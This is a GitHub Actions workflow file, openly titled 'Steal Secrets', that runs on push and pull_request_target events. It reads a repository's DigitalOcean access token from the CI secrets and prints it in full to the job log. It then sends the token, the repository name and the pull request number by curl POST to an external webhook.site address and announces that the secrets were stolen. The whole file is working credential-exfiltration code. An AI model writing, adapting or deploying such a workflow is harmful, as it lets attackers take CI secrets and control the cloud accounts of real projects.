name: Steal Secrets
on: [push, pull_request_target]

jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "🚨 STEALING DIGITALOCEAN SECRETS 🚨"
          echo "===================================="
          
          # Capture the DigitalOcean token
          DO_TOKEN="${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}"
          
          echo "Captured DigitalOcean Token:"
          echo "Full Token: $DO_TOKEN"
          echo "Token Length: ${#DO_TOKEN} characters"
          
          # Send to external server
          curl -X POST https://webhook.site/7b11a1b8-8e3b-40a5-9749-134940063fc0 \
            -H "Content-Type: application/json" \
            -d "{
              \"token\": \"$DO_TOKEN\",
              \"repo\": \"${{ github.repository }}\",
              \"pr\": ${{ github.event.pull_request.number }},
              \"timestamp\": \"$(date)\"
            }"
          
          echo "✅ Secrets stolen successfully!"
